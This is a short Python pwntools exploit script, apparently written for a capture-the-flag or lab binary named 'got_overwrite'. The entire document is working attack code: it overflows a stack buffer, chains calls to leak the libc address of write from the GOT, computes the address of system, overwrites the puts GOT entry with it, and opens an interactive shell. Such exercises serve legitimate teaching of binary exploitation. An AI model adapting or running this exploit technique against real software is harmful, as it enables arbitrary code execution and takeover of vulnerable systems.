#-*- coding: utf-8 -*-
from pwn import *

p = process(["./got_overwrite"])
elf = ELF('got_overwrite')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

write_plt = p32(elf.plt['write'])
write_got = p32(elf.got['write'])
read_plt = p32(elf.plt['read'])
puts_got = p32(elf.got['puts'])
addr_main = p32(0x804846b)
addr_write = libc.symbols['write']
addr_system = libc.symbols['system']
offset_system = addr_write-addr_system

sleep(0.4)

p.recvuntil(' : ') 
#print hex(elf.plt['write'])
#print hex(elf.got['write'])

payload = "a"*52
payload += write_plt
payload += addr_main
payload += p32(1)
payload += write_got
payload += p32(4)
#pause()
p.sendline(payload)

sleep(0.4)
p.recv(8)
leak_addr = u32(p.recv(4))

addr_system = leak_addr-offset_system

print hex(leak_addr - addr_write)
#print hex(offset_system)
#print "leak : ",hex(leak_addr)
#print "system : ",hex(addr_system)

p.recvuntil(" : ")

payload2 = "a"*52
payload2 += read_plt
payload2 += addr_main
payload2 += p32(0)
payload2 += puts_got
payload2 += p32(4)

#pause()
sleep(0.4)
p.sendline(payload2)

p.recvline()


sleep(0.4)
payload3 = p32(addr_system)

#print "pay:",payload3
p.sendline(payload3)

p.recv()

p.interactive()